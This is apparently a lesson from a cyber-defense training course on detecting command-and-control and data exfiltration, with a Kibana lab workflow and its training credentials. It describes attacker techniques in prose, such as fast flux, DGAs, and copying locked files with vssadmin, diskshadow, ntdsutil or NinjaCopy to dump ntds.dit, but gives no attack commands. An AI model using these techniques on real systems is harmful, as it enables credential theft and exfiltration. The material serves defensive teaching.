﻿

Dynamic Resolution (T1568)
﻿

Domain Name Systems (DNS) play an invisible role in all network communications. DNS is the source of several C2 defense evasion tactics including DNS Calculation (T1568.003), Fast Flux DNS (T1568.001), and Domain Generated Algorithms (DGA T1568.002).

﻿

DNS Calculation (T1568.003)﻿

﻿

When a computer sends a DNS request, it is asking for the Internet Protocol (IP) address associated with a domain, normally to connect to that IP address. With the DNS calculation tactic, the malware decodes a different IP address and potentially ports from the original address returned from the DNS query. This allows attackers to throw off a defender who may be looking for traffic to the IP provided by the DNS resolution. The specifics are limited only by the creativity of the malware author. The attacker may have the malware flip the IP address such that 1.2.3.4 becomes 4.3.2.1. Another possibility is pulling out a port from an IP address, such as changing 4.3.2.180 to 4.3.2.1:80.

﻿

Fast Flux DNS (T1568.001)﻿

﻿

DNS is not a 1:1 relationship. Multiple domains can resolve to the same IP address and multiple IP addresses can resolve to the same domain. In the case of a fast flux network, the attackers change the IP addresses associated with a single domain very rapidly. This makes it difficult to block an IP address since the registrations have an average life span of 5 mins.

﻿

Domain Generation Algorithms (DGA) (T1568.002)﻿

﻿

DGA makes it difficult to block a domain. If a piece of malware has a single domain hard-coded in the binary, then researchers can find that domain and proactively block it. DGAs work like two-factor security tokens that are constantly generating a 6-digit number based on a seed value. The malware tries to reach out to a randomly-generated domain name on a predefined time interval. When the attacker wants to communicate with the malware, the attacker just needs to register one of the millions of domains the malware tries to use. Since these algorithms are not truly random, the attacker knows the exact time or domain the malware will attempt to connect. Defensive tools that block domains typically do not accept DGAs as input. Blocking the DNS request is prohibitively difficult since DNS servers do not have unlimited resources.

C2 Logs and Data Sources
Network-based logging provides the primary log and data sources for detecting C2 and data exfiltration. However, host analysts can gather relevant information from these sources, as well.

﻿

Gathering Network-Based Logs from the Host
﻿

Using the host to gather network logs is not ideal, but there are situations where this is the only option. The reason the network-based logs are a better choice is because the logging is centralized and difficult to tamper with. 

﻿

To use the host, defenders can configure Sysmon to provide network log data. The Sysmon Events noted below, with their respective Identifiers (ID), provide important details that are available at the host level. This information is not provided at the network level.

Sysmon ID 3: Network Connections: Provides information with name resolution of the IP address.

Sysmon ID 22: DNS Query: Displays processes that make the query.

A more detailed list of events emerges when this information is logged and correlated with other event logs. Sysmon ID 1 displays process creation along with the hash of the file. Sysmon ID 7 displays when an image is loaded into memory and provides information on whether the binary is digitally signed. A Security Information and Event Management (SIEM) tool alerts on subtle combinations of events, which defenders can use to create powerful signatures. 

﻿

Detecting C2
﻿

This section covers various ways to detect C2 at the host and network layers. There are many ways to detect C2 activity due to its varied nature. Several successful strategies include checking for a specific tactic by analyzing specific logs, checking for anonymous behavior in general, and looking for contextual inconsistencies. 

﻿

Hypothetical Signature to Detect DNS Calculation (T1568.003)
﻿

One way to detect C2 is to check for a specific tactic by analyzing specific logs. Below is a list of expected behavior for this tactic and their related data sources:

Process loads that is not digitally signed

Sysmon Event ID 7: Image Loaded

Request for a domain

Sysmon Event ID 22: DNSEvent

Process connects to an IP address

Sysmon Event ID 3: Network Connection

Windows Event ID 5156: The Windows Filtering Platform has permitted a connection

The content from these logs needs to be put in context for this signature to work. The process name from the ID 7 log would be seen in the ID 22 and ID 3 logs. Then, the alert would fire when the IP that was resolved in ID 22 did not match ID 3 within a certain time frame.

﻿

Detecting Frequency-Based Network Connections
﻿

C2 protocols used by malware are going to vary significantly. As defenders find new ways of detecting these C2 channels, the attackers will find new ways to hide them. One constant, however, goes back to the original problem that beaconing malware is trying to solve. That is, getting past a firewall that does not allow inbound connections. 

﻿

Attackers cannot freely communicate with a system on the other side of a firewall that is blocking inbound connections. Instead, that system has to go outbound to the attacker. That means there is this delicate balance between the attacker being able to communicate with the malware and how noisy the malware is going to be on the network when reaching back out. A higher frequency of outbound connections shortens the maximum time an attacker has to wait. Conversely, if the time between beacons is too long, it becomes difficult for the attacker to gain access when required. 

﻿

Figure 3.5-1, below, illustrates how the number of beacons an attacker employs in a day affects attacker convenience and stealth. More beacons rapidly increase attacker convenience up to a certain point, before convenience only increases incrementally. This greater convenience comes at the cost of an exponential decrease in stealth.

﻿

﻿

Figure 3.5-1﻿

﻿

The most obvious beaconing malware has a static amount of time between beacons. The beacons are the same. A beacon, in this sense, is any of the previously mentioned C2 TTPs. Malware can be more tricky. The outbound connections for malware can be spaced out and more sporadic. Malware may even rotate through domains with a DGA. 

﻿

Beacons are also short messages that do not have much data. These messages only check for commands to execute. If there is a command to execute, then more data is transmitted, but not necessarily to the same system. For example, an infected system asks the C2 server for a command, but the C2 server replies with a command to upload a file to a secondary system.

﻿

Beacons Need Context
﻿

In the early 2010s, the Air Force saw a surge in alerts describing a known beacon for malware. For a moment, it looked like hundreds of computers were compromised. What actually happened was malicious actors had broken into a legitimate website and added a Hypertext Markup Language (HTML) comment on the front page of a small town's local news site. 

﻿

This malware worked by loading the news site, just like a normal user, then cutting out that special comment as a means of C2. None of the systems in the Air Force network were infected. The normal user activity appeared identical to malicious activity at the network layer.

﻿

One major benefit of host-based logging for these types of signatures is that the log contains more information than what is logged at the network level. Sysmon allows logging of the exact process that is making a web request. This helps determine if a known good process was making that web request or if it was a binary that was recently added to the machine. There are ways around this as an attacker. If the attacker had done process injection into a web browser, then all the attackers requested would be coming out of that "known good" process. 

﻿

Detecting Anomalous Artifacts within Web Request Artifacts
﻿

All web requests have a metadata section called "headers." This is where clients advertise their compatible browser versions and attach any cookies. The server also has details in these headers to help facilitate communication. Complicated software, such as a web browser, has a lot of "edge cases" or rare situations to account for. Malware clients and servers are dramatically simpler and do not have these requirements. In an effort to blend in with legitimate traffic, malware pre-populates these fields with data that can be convincing, but does not perfectly match the chaos of actual web traffic. 

﻿

User-Agent Strings (Request Header)﻿

﻿

Network clients announce their compatibility with certain software versions to servers. This is done over the web with a user-agent string. The default user agent string for a system running Chrome 70.0.3538.77 is as follows:

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36.
﻿

This string starts with "Mozilla/5.0" even though this is Chrome. Mozilla is a non-profit that makes Firefox. The reason it is in all of these user-agent strings is because the string is showing what this client is compatible with so the server has a better chance of understanding how to present the webpage. 

﻿

User-agent strings are one of those small details that are hard to keep up-to-date. Even if the installed malware hard-codes the exact user agent string used by the system's browser, it only takes one update to make it stand out again. 

﻿

Server Value (Response Header)﻿

﻿

When a web client asks for data from a server, the response has headers populated by the server. One of these fields is just called "server" and has the name and version of the web server. A bad malware author may not adjust this detail and the malware server may be easy to identify.

﻿

Encryption﻿

﻿

In an ironic twist, encryption is used by malicious actors to make computer systems more insecure. With a Hypertext Transfer Protocol Secure (HTTPS) connection, the malicious traffic becomes significantly more difficult to analyze because the entire connection, including headers, is unreadable.

﻿

Systems do exist to enable defenders to see within encrypted traffic and are available to large organizations with deep pockets. The way these work is also ironic because they use a common attacker technique called Person-In-The-Middle (PITM). With this setup, all hosts within a network make secure, encrypted communications to a web proxy. Then, that web proxy makes a secure, encrypted connection to the website. Within that machine, the network traffic is unencrypted and can be logged and manipulated by network defense technologies. 

﻿

These systems are expensive because they need to have specialized hardware to support fast encryption processing.

Detect Beaconing C2
There are many ways to detect beaconing C2 activity. The next two workflows provide the opportunity to detect and hunt beaconing C2 activity using Elastic.

﻿

Detect Beaconing C2 Activity
﻿

Elastic transforms are one way to smartly condense information. Elastic stores information in individual rows that help identify trends across multiple points of data. This helps detect C2 beaconing activity. The transformation in this workflow creates a new data source based on the specific rules. This data can be used, just like any other log source, in the Discover section of Kibana. 

﻿

Complete the following workflow to detect beaconing C2 behavior using an Elastic pivot transform. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the Chrome browser.

﻿

3. Log in to the Security Onion Console (SOC) with the following credentials and select the Transforms - Elastic bookmark.

URL: https://199.63.64.92/kibana/app/management/data/transform
Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

4. Select Create your first transform and choose *:so-* as the source.

﻿

5. On the page Create transform, select Pivot.

﻿

6. Configure the Pivot Transform query as follows:

Index pattern: *:so-*
event.category: network and not destination.ip: 127.0.0.1
﻿

7. Ensure the Transform query is recorded by pressing the enter key to execute the query. Watch for the Elastic logo to animate and the section Transform preview, at the bottom of the page, to update with the results from the transform query.

﻿

8. Configure the grouping and aggregation rules for this transformation as follows:

Group by:
terms(agent.name)
terms(destination.ip)
terms(destination.port)
date_histogram(@timestamp), interval: 1h

Aggregations:
value_count(agent.id)
﻿

The purpose of the group by options and aggregations can be seen in the section Transform preview. With this configuration, a new data source is created that counts how many times each host has reached out to a particular destination IP address and port within a one-hour time frame. Each connection has a unique agent.id field. The method value_count shows the total number of connections by a host.

﻿

9. Select Next and enter the following Transform details:

Transform ID: host_dest_port_count
Transform description: Shows the number of connections between systems within a 1 hour time frame
Destination Index: host_dest_port_count_index
﻿

10. Select Next.

﻿

11. Select Create and Start to run this transform on all data.

﻿

The results of the grouping and aggregation are indexed to enable quick searching. This process takes a few minutes.

﻿

12. Return to the page Discover.

﻿

13. Change the index pattern from *:so-* to host_dest_port_count_index.

﻿

14. Narrow the query down to the following time range and sort by the number of connections:

Start: Mar 23, 2022 @ 12:00:00.00
End: Mar 25, 2022 @ 00:00:00.00
﻿

15. Select the following columns: 

agent.name
destination.ip
destination.port
agent.id.value_count
﻿

NOTE: If the column agent.id.value_count is not sorting as expected, deselect the default sorting based on time.

﻿

16. Filter out any connection data going to or from the dc-01 host with the following query:

not agent.name: dc01 and not destination.ip: 172.16.2.5 and not destination.ip: 10.10.*
﻿

NOTE: The 10.10.* network range in the query is the administrative part of the simulated environment and not part of this scenario.

﻿

Use the information from this workflow to answer the following question.

Recognizing Data Exfiltration TTPs
Exfiltration Behaviors on the Network
﻿

Data exfiltration is simply unauthorized data being removed from a network. It occurs when attackers have successfully exploited a target network and are attempting to pilfer the contents.

﻿

Figure 3.5-6, below, summarizes exfiltration TTPs documented by the MITRE ATT&CK framework. In this illustration, arrows moving away from the file indicate exfiltration tactics that cause the data to be removed from the system. Arrows pointing towards the file indicate exfiltration tactics that aid in defense evasion. Defense evasion tactics are mix-and-match and are able to be used in conjunction with other tactics.


﻿

﻿

Figure 3.5-6﻿

﻿

The most common exfiltration techniques are just over the existing C2 channel using HTTPS. HTTPS blends in with normal web traffic and most organizations do not have the hardware to tear apart the encryption.

﻿

Exfiltration Behaviors on the Host
﻿

Exfiltration is relatively straightforward, however, there are a few things that attackers may stumble upon. These behaviors are present in the logs and in actionable hunt hypotheses.

﻿

Dynamically Changing File
﻿

Imagine an attacker wants to download a large file that gets updated on a regular basis. These files may include anything from databases to large PowerPoint files filled with images. One way to deal with this is to stage the file in a secondary location. Moving a copy of a file is much easier because the data can be broken up into smaller chunks and exfiltrated low and slow. Without the intermediary file, the file segments produce a corrupted file.

﻿

Hunting for staged exfiltrated files is a good starting point for networks that are assumed to have had a large amount of data exfiltrated. This is especially true if the logs for these networks also do not show any significant traffic spikes. 

﻿

Common places for data to be staged include the user's or operating system's temp directory. These files also tend to be compressed. The MITRE ATT&CK framework has an extensive list of threat actors and their favorite places to stage files. 

﻿

Possible staged file attributes include the following:

Large file size

Located in a temp folder

Compression

Incorrect file extension (such as a zip file that is labeled as .log)

Read/Write access is inconsistent with other temp files in that folder (For example, if the folder is for Google Chrome, but Chrome is not the program accessing the files)

Operating System Does Not Allow Access to the File
﻿

In a Windows computer system when a program needs to access a file the program asks the operating system for a "file handle." A handle is a temporary reference number the program gives back to the operating system when it wants to read or write from that resource. In Linux, this is called a "file descriptor." Forensically knowing what files a program is manipulating provides insight into the function of that program.

﻿

The file handle or file descriptor is a way for the operating system to ensure that only one program is able to manipulate a file at a time. If a program is actively reading or writing to a file, then other programs will not be able to get access to that data. This is referred to as a file being "locked open."

﻿

Antivirus software uses the file handle step to scan files for viruses and similar threats when a user tries to open the file. This saves the antivirus software from having to constantly recheck every file on a system every time a new malware signature is added. While unlikely, it is possible for an attacker to generate logs by trying to open a non-malicious file and inadvertently triggering the antivirus program to create an alert.

﻿

Attackers have developed several different methods for getting data from a file that is locked, including the following:

Raw file system access

Vssadmin

Diskshadow

NTDSUtil

﻿

Raw File System Access﻿

﻿

The operating system is interacting with the underlying file system when it reads and writes data to the file on the hard disk. It is possible for a program to bypass the operating system and directly access the volume (T1006). Since PowerShell has the same capabilities as a compiled program, there exists a PowerShell script that can directly access files on the disk named "NinjaCopy." This technique bypasses an antivirus that is watching for programs to access a file as well as any administrative controls on the file defined in the operating system. 

﻿

MITRE ATT&CK links these attack techniques to threat actors. This technique has not been seen used by any particular threat actor, however, this technique is also extremely difficult to detect and mitigate. Currently, the only known detection method is installing Sysmon and monitoring for Event ID 9: Raw disk access. Enabling that logging increases system load.

﻿

The good news is that this requires admin access, anyway, so the bypassing of administrative controls is not as bad as it sounds. There are also a limited number of systems that benefit from this logging, namely just the domain controller.

﻿

Vssadmin﻿

﻿

VSSADMIN is a built-in Windows command that is used to manipulate volume shadow copies. A volume shadow copy is a Microsoft technology that can create backup copies of files or volumes even when they are in use.

﻿

A hacker leverages this technology by making a volume shadow copy of the drive with the locked files, copying over the locked files, and then deleting the volume shadow copy.

﻿

Diskshadow﻿

﻿

Diskshadow is a built-in Windows command that replaces vssadmin for modern operating systems. Diskshadow is for Windows 8+ era operating systems, however vssadmin also works. 

﻿

﻿

NTDSUtil﻿

﻿

The "crown jewel" of files that exists within a network lies on the domain controller. It is the file ntds.dit. This file is the database that stores active directory data, which includes usernames and passwords for every user. It is locked because the domain controller is always actively using it.

﻿

Ntdsutil is a Windows built-in command that is used to perform database maintenance functions for active directory domains. The function that attackers use is its ability to create a full dump of the ntds.dit database to disk. The dumped data is then exfiltrated.

﻿Data Exfiltration Data Sources
Exfiltration Log Sources
﻿

At the most basic level, exfiltration is moving data out of the network. Network traffic-based logs are the most useful sources for identifying exfiltration. However, there are also several other sources on the host that help with this identification.

﻿

Network Layer Detection
﻿

Bytes sent and received and the number of connections in a given time are useful metrics to capture and analyze. At the network layer, these data sources are found on the respective network devices responsible for providing those services. DNS logging is best provided at the lowest level, nearest the host. Network connection logs are important to collect at the service, instead of just at the boundary firewall. This is because the service provides additional context where the boundary device, such as a firewall, only provides metadata on the connection.

﻿

Producer-Consumer Ratio (PCR)
﻿

The PCR is a simple ratio of upload versus download, as demonstrated in Figure 3.5-7, below. While PCR does not directly correlate with malicious activity, it is an additional indicator for defenders to consider. Coupled with other indicators, PCR provides additional insight into the traffic.

﻿

This illustration below shows how PCR is calculated. A session that is biased towards downloading data has a negative value, with -1 indicating 100% download. A session that is biased towards uploading has a positive value, with 1 indicating 100% upload. Over large datasets, certain protocols converge to various values. For example, web browsing is typically around -0.5 while activity such as sending an email is normally around 0.4. Protocols such as Network Time Protocol (NTP) and Address Resolution Protocol (ARP) tend to send and receive equal amounts of traffic. They are considered "balanced" in terms of the PCR. 

﻿

Host Layer Detection
﻿

It is harder to hide malware in host-based logs due to the additional context. At the network layer, a web request only contains the source and destination along with the message. At the host layer more context is available. Not only is the exact binary known at the host level, but that binary's digital signature status is also apparent. 

﻿

Detecting Staging
﻿

Data staging has a few attributes that produce forensic evidence on the host. If the attacker uses built-in Windows commands to make a copy of a dynamic or locked file, then the creation of those processes can be captured by a properly configured Sysmon deployment. These processes include NTDSUtil, Diskshadow, and VSSAdmin. The process creation generates a Sysmon Event ID 1: Process Creation, Sysmon Event ID 7: Image loaded, and a Windows Event ID 4688. 

﻿

If the attacker is using a tool such as Ninja-Copy to do raw file system access (T1006), the corresponding Sysmon event for this particular technique is Event ID 9: RawAccessRead.

﻿

Regardless of how the attacker makes a copy of the file, the staged file generates a Sysmon Event ID 11: FileCreate and a Windows Event ID 4663. 

﻿

Detecting Anomalous Network Connections 
﻿

Host-based network traffic logging is covered by Windows Event ID 5156 and Sysmon Event ID 3. Both of these events provide the name of the executable using the network, as well as the metadata on the network connection (source, destination IP, and port). Coupled with Sysmon Event ID 7, the defender is armed with the hash and knowledge of whether or not the binary is digitally-signed and trusted by the host.

﻿

One way for the attacker to bypass this type of logging is to inject the malicious payload into a process that normally conducts network traffic. For example, the attacker may have a binary that exfiltrates data out of the network that spoofs a Firefox user-agent string. In this case, injecting that library into a running Firefox browser makes discovery of the exfiltration difficult, even for a host-based analyst. 

﻿

While an injected payload makes data exfiltration harder to discover in the logs, it just means that the defender needs to detect process injection. Detecting process injection is outside the scope of this lesson, however, this is another technique that Sysmon detects, with the proper configuration. Further reading on process injection is available at the MITRE ATT&CK website. Currently, eleven different techniques are documented by MITRE.

﻿Elastic Scripting Primer
The previous section of this lesson provided the logic behind calculating the PCR. The following workflow provides a script to detect PCR in web traffic. This section provides a brief refresher and explanation of the scripting concepts used in the upcoming workflow.

﻿

Below, Figure 3.5-8 describes the steps in the Elastic script scripted_metric. The major stumbling block is that Elastic runs the scripts in parallel to speeding up searches. This means that the script does not provide all the search items at a single time. Instead, the search is broken apart into “shards.” Elastic executes each shard independently before bringing them back together into a single final output.

﻿

The four sections of the scripted_metric include init_script, map_script, combine_script, and reduce_script. Only the first section, init_script, is optional. The rest of the sections are required. The sequence for these sections is as follows:

﻿

init_script: Defines variables to use between the map_script and combine_script steps.

A query filters all items into shards for the rest of the script. This step defines the state variables for each shard. 

map_script: Maps the given Elastic documents into the variables defined in the init_script step. 

The values within the searched documents are in scope at this step and can be accessed in the code. This step stores data, but does not return anything.

combine_script: Returns data. 

This is the last step Elastic runs in parallel against the shards. The data returned is aggregated into a list and passed to reduce_scripts as the variable “states.” This data can be as simple as the data structure from the init_script step or it can use logic to create a new data structure.

reduce_script: Combines all the data from the individual shards into a usable output. 

All outputs from the combine_script step are put into a combined list called states. This step implements any final logic and returns data as a single, final output.

Ternary Operators
﻿

A ternary operator is a coding shortcut for reducing the number of lines of code required for a script. Software developers use these to shorten the code and make it easier to read. In Elastic, the limited space to write code means that ternary operators are commonly used to keep the text short.

Figure 3.5-9, below, displays an example of script logic in the usual coding format, followed by its equivalent as a ternary operator.

Augmented Assignment
﻿

Augmented assignments are also common shortcuts. In software, it is common to iterate through a list of items and count the number of items that meet certain criteria.

﻿

Figure 3.5-10, below, illustrates an example of common augmented assignment shortcuts. In this example, each code block provides a different way to perform the same function. The code blocks each count the total number of items that are of type car. The shortcuts +=, in the center code block, and ++ in the right-most code block are both shortcuts for the highlighted portion of the first block. Similarly, the operator -- decrements a number by one.














